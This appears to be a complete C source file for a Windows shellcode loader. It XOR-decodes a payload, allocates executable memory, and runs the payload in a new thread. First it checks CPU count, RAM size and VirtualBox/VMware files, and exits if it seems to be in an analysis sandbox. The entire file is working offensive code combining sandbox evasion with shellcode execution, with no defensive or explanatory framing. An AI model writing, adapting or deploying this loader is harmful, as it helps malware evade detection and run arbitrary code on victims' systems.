#include "Header.h"

void XorAndInjectShellcode()
{
	BYTE* shellcode_executable = (BYTE*)VirtualAlloc(0, sizeof shellcode, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
	for (int i = 0; i < sizeof shellcode; i++)
	{
		shellcode_executable[i] = shellcode[i] ^ 0x11;
	}
	DWORD threadID;
	HANDLE hThread = CreateThread(NULL, 0, (PTHREAD_START_ROUTINE)shellcode_executable, NULL, 0, &threadID);
	WaitForSingleObject(hThread, INFINITE);
}

bool CheckCPU()
{
	SYSTEM_INFO systemInfo;
	DWORD numberOfProcessors;

	// CHECK NUMBER OF LOGICAL PROCESSORS //
	GetSystemInfo(&systemInfo);
	numberOfProcessors = systemInfo.dwNumberOfProcessors;
	////////////////////////////////////////

	if (numberOfProcessors < 4) return true;
	else return false;
}

bool CheckRAM()
{
	MEMORYSTATUSEX memoryStatus;
	memoryStatus.dwLength = sizeof(memoryStatus);
	DWORD RAMMegaBytes;

	// CHECK PHYSICAL MEMORY AMOUNT //
	GlobalMemoryStatusEx(&memoryStatus);
	RAMMegaBytes = memoryStatus.ullTotalPhys / 1024 / 1024;
	//////////////////////////////////

	if (RAMMegaBytes < 4096) return true;
	else return false;
}

bool CheckVMFiles()
{
	WIN32_FIND_DATAA findFileData;
	bool anyFileExists;

	// SEARCH FOR FILES SPECIFIC FOR YOUR HYPERVISOR //
	HANDLE findFileHandle1 = FindFirstFileA("C:\\Windows\\System32\\VBox*.dll", &findFileData);
	HANDLE findFileHandle2 = FindFirstFileA("C:\\Program Files\\VMware", &findFileData);
	anyFileExists = (findFileHandle1 != INVALID_HANDLE_VALUE || findFileHandle2 != INVALID_HANDLE_VALUE);
	///////////////////////////////////////////////////

	if (anyFileExists) return true;
	else return false;
}

bool Sandboxed()
{
	if (CheckCPU() || CheckRAM() || CheckVMFiles()) return true;
	else return false;
}

int main()
{
	if (Sandboxed()) return 0;
	XorAndInjectShellcode();
}